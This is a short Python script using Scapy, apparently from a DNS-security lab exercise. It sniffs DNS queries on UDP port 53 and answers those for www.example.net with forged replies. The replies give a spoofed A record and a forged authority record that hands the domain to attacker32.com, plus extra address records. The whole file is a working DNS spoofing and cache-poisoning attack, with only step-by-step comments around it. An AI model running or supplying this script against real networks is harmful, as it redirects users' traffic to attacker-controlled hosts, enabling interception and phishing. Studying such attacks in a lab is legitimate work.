from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
        # Construct IP header
        # Swap src IP and dst IP
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Construct UDP header
        # Swap src port and dst port
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # Construct DNS Answer section
        # www.example.net -> 192.168.2.1
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='192.168.2.1')

        # Construct DNS Authority section
        # example.net -> attacker32.com
        NSsec = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')

        # Construct DNS Additional section
        # ns1.example.net -> 1.2.3.4
        # ns2.example.net -> 5.6.7.8
        Addsec1 = DNSRR(rrname='ns1.example.net', type='A', ttl=259200, rdata='1.2.3.4')
        Addsec2 = DNSRR(rrname='ns2.example.net', type='A', ttl=259200, rdata='5.6.7.8')

        # Construct DNS response
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=1,
            arcount=2,
            an=Anssec,
            ns=NSsec,
            ar=Addsec1/Addsec2
        )

        # Connect headers with data
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        # And send it
        send(spoofpkt)

pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)